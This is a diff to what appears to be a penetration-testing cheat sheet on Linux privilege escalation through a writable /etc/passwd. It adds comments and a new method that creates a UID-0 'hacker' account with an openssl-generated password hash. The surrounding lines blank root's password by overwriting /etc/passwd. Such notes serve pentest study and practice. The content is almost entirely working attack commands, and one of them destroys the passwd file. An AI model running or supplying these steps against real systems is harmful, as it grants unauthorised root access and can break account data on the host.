@@ -76,6 +76,8 @@ If you have write permission to the following files:
    su - hacker
    id && whoami
    
+// Add new user to the system with GID and UID of 0   
+   
 OR
    
   vi /etc/passwd
@@ -84,10 +86,21 @@ OR
   su root
   id && whoami
   
+// Remove root's password  
+  
 OR
 
   echo root::0:0:root:/root:/bin/bash > /etc/passwd
   id && whomai
+  
+OR
+
+openssl passwd NewRootPassword
+Copy output
+echo "hacker:<output>:0:0:root:/root:/bin/bash" > /etc/passwd
+Replace <output> with the copied output
+su hacker
+id && whoami
   
 ```  
 /etc/shadow 
